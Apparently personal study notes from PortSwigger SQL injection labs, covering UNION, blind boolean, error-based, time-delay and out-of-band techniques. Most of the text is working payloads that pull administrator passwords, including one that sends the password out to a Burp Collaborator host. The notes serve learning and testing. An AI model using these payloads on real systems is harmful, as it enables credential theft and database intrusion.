@@ -1,0 +1,305 @@
+
+                                     SQL Injection
+                                     -------------
+
+ => If a site has SQL injection and the query results are response in the site,
+ we can use UNION attack, also called    =>    [ SQL UNION INJECTION ]
+
+
+ order by 1,..=> correct unless the number of the column is false
+-----------------------------------------------------------------
+
+union select null,.. => false until the column number is correct
+----------------------------------------------------------------
+
+=> on oracle database, there is a build-in table called DUAL
+so payload for oracle db would need to look like 
+[ ' UNION SELECT NULL FROM DUAL-- ]
+
+
+In sql injection UNION attack , the data sent from server is string data, so we need to find at least one column which can retrive the string data , so we can test like this
+' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT NULL,'a',NULL,NULL--
+' UNION SELECT NULL,NULL,'a',NULL--
+' UNION SELECT NULL,NULL,NULL,'a'--
+
+
+Database_Type                          query
+-------------                          -----
+mysql                                  @@version
+oracle                                 v$version
+postgresql                             version()
+
+
+
+Exploiting blind SQL injection by triggering conditional responses
+------------------------------------------------------------------
+
+consider an application used tracking cookie like this
+
+Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4 [ select trackingid from trackuser where trackingid='u5YD3PapBcR4lN3e7Tj4']
+
+=> so we can inject like this, […xyz' AND '1'='1]
+then the successful response on the site will be like (welcome or any specific keyword)
+
+so we can define where our exploit is success or no
+
+then we can guess the password character by character like this
+
+[ xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm ]
+
+
+
+
+
+
+
+Lab: Blind SQL injection with conditional responses
+---------------------------------------------------
+1. first i inject the basic sql statement but doesn't work
+2. so i decided to try the blind technique with burp
+3. so in burp , there is a something called [TrackingId] infront of the session cookie like this
+
+[ Cookie: TrackingId=xQb7HdJdAxpujzrP; session=2pdw1KEFCyyDmVLCEljJBHjoQHl9QZ8Z ] 
+
+4. so i inject it wiht ' and works [ =xQb7HdJdAxpujzrP' AND '1'='1 ]
+5. so find if there is a table called 'users' with 
+
+[ ' AND (select 'a' from users limit 1)='a ]
+
+6. then check if there is a username called 'administrator' with
+
+[ ' AND (select 'a' from users where username='administrator')='a ]
+
+7. then we need to determine how many characters does the administrator have with
+
+[ ' AND (select 'a' from user where username='administrator' and length(password) > 1)='a ]
+
+8. i found there is 20 characters of password and i need to reveal by bruforcing what it is with
+
+[ ' AND (select substring(password,1,1) from users where username='administrator')='$a$ ]
+
+
+9. after burforcing with digits and alpabets , finally i got the password => 5wlynq4i9et1aw20y4uv
+
+10. BOOM!
+
+
+
+
+
+
+Error-based SQL injection
+-------------------------
+
+xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
+
+If the password's first character is greater than 'm', then it will be error.
+
+If not , the condition is true and no error
+
+
+
+
+LAB: Blind SQL Injection with SQL error
+---------------------------------------
+1. first i test the parameters with basic technique but doesn't work
+
+2. so i check with burp and got trackingid in the cookie session 
+
+3. so i test with ' and it works and i close it with another one like this [=asdkjfds'']
+
+4. then i need to verify what type of database it is with [=adf'|| (select '')||']
+
+5. it gets error , so i change it into [=adf'|| (select '' from dual)||'], true
+
+6. so database type => oracle
+
+7. then i check if there is a table called 'users' with [ =adsf' || (select '' from users where rownum=1) || '], yes it corrects
+
+8. table_name => users
+
+9. then check if there is a username called 'administrator'
+[ =ad' || (select '' from users where username='administrator') || ' ] yes it has
+
+10. username = administrator
+
+11. now we need to bruteforce the password, 
+
+'||(SELECT CASE WHEN (length(password)=20) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+12. so the password length is 20 , let bruteforce it
+
+' ||(SELECT CASE WHEN SUBSTR(password,1,1)='$a$' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+13. The golden password => 6ubj0epsa5au61hqe0en
+
+14. BOOM!
+
+
+
+
+
+Extracting sensitive data via verbose SQL error messages 
+--------------------------------------------------------
+
+sometimes , due to the misconfiguration of the database, we can see the sensitive data from the sql error.
+
+CAST() => can change from one data type to another
+
+CAST((SELECT example_column FROM example_table) AS int)
+
+ဘယ်လို အလုပ်လုပ်လဲ -
+
+    များသောအားဖြင့် ကျွန်တော်တို့ ဖတ်ချင်တဲ့ Data က String Type ဖြစ်နေပါတယ်။
+
+    ဒီ String Data ကို int (integer - ကိန်းပြည့်) လို Incompatible Data Type (မတည့်တဲ့ Data Type) ကို ပြောင်းလဲတဲ့အခါ Error ဖြစ်ပါတယ်။
+
+    Error Message ထဲမှာ ကျွန်တော်တို့ ဖတ်ချင်တဲ့ Data ပါလာပါတယ် -
+
+
+
+
+
+
+
+
+Lab: Visible error-based SQL injection
+--------------------------------------
+1. First of all, i inject the basic sql syntax and doesn't work
+2. so i try with burp and got trackingId and test with ', it gets into error like this
+
+Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'iV6UDnuYW6XviU22''. Expected  char
+
+3. so i realize that the error show the sensitive data due to database's misconfiguration
+
+4. and i close the cmd with --
+
+5. so i inject like this and error show 
+
+ERROR: argument of AND must be type boolean, not type integer
+  Position: 63
+
+6. so the payload would be like this
+
+' AND 1=CAST((SELECT 1) AS int)--' AND 1=CAST((SELECT 1) AS int)--
+
+7. so there is no longer error, so when i inject like this
+
+asdjfklasf' AND 1=CAST((SELECT 1) AS int)--
+
+8. got new error 
+
+Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'iV6UDnuYW6XviU22' and 1=cast((select username from users) as'. Expected  char
+
+9. so we need to reduced the sentenced because the sentence is too long and intercept at 'as'
+
+10. so i left blank to TrackingId and the payload is like this
+
+'  AND 1=CAST((SELECT username from users) AS int)--
+
+11. There is another error 
+
+ERROR: more than one row returned by a subquery used as an expression
+
+12. that means we need to limit just one table, so the final paylaod will be like this
+
+username
+--------
+' AND 1=CAST((SELECT username from users limit 1) AS int)--
+
+' AND 1=CAST((SELECT password from users limit 1) AS int)--
+
+13. BOOM!
+
+
+
+
+
+Lab: Blind SQL injection with time delays and information retrieval
+-------------------------------------------------------------------
+
+1. first i test the parameter if it is vulnerable to sql injection but no
+
+2. so i check with burp and test the tracking id , but ether doesn't work
+
+3. so i have to test the blind time delay method, with ' || pg_sleet(10)--
+
+4. it works (sql injection vulnerable)
+
+5. ' || (select case when (1=1) then pg_sleep(10) else pg_sleep(0) end)--
+
+6. ' || (select case when (username='administrator') then pg_sleep(10) else pg_sleep(0) end from users)--
+
+7. ' || (select case when (username='administrator' and length(password) > 1) then pg_sleep(10) else pg_sleep(0) end from users)--
+
+8. got password is 20
+
+9. ' || (select case when (username='administrator' and substring(password,1,1) = 'a') then pg_sleep(10) else pg_sleep(0) end from users)--
+
+10. The password is : q9f3hn6xtyejgf6d76x0
+
+BOOOM!!!!
+
+
+
+
+
+
+
+Lab: Blind SQL injection with out-of-band interaction
+------------------------------------------------------
+1. First i test the basic steps and it doesn't work 
+even tracking id doesn't work with time dedaly so i have to try the out-out-band interaction technique
+
+2. so i started the burp collaborator and copy the domain 
+
+3. then search the payload from the sql injection cheat sheet from the portswigger
+
+4. payload = '|| (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://9dnq735j0hkhxviy25ho79ofu60xopce.oastify.com/"> %remote;]>'),'/l') FROM dual)--
+
+5. then click the poll now 
+
+BOOOMMMM!!!!!
+
+
+
+
+
+
+Lab: Blind SQL injection with out-of-band data exfiltration
+-----------------------------------------------------------
+
+payload = '+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'knb1hefuasus76s9cgrzhkyq4ha8y4mt.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
+
+and check the burp collaborator and the BOOM!
+
+
+
+
+
+
+
+Lab: SQL injection with filter bypass via XML encoding
+------------------------------------------------------
+1. In burp , i check the stock and then got xml format 
+<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+
+2. so i try to know if the storeid can be changeable , like storeId>1+1</storeId>
+then i show me the 2nd stock's value
+
+3. so realize that it can be inject
+
+4. when i inject like [1 union select null]   => attack detect
+
+firewall protection
+
+5. so i need to bypass this mother fucker
+
+6. in burp encode like this [Extensions > Hackvertor > Encode > dec_entities/hex_entities.]
+
+7. 
+
+
+
+
